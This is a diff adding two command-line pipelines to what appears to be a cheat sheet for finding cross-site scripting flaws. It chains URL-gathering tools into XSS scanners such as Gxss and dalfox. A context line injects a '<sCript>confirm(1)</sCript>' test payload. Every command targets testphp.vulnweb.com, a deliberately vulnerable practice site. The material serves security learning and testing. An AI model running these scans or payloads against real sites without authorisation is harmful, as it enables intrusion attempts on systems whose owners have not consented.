@@ -28,6 +28,10 @@ echo "testphp.vulnweb.com" | waybackurls | egrep -iv ".(jpg|jpeg|gif|css|tif|tif
 ```
 
 - ```echo "testphp.vulnweb.com" | gau | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln```
+
+- `echo "testphp.vulnweb.com" | katana -passive -pss waybackarchive,commoncrawl,alienvault | uro | gf xss | Gxss -p XSSRef | dalfox pipe`
+
+- `subfinder -d testphp.vulnweb.com -all -silent | katana -passive -pss waybackarchive,commoncrawl,alienvault | uro | gf xss | Gxss -p XSSRef | dalfox pipe`
   __Tools used__
 - __[waybackurls](https://github.com/tomnomnom/waybackurls.git)__
 - __[urldedupe](https://github.com/ameenmaali/urldedupe.git)__
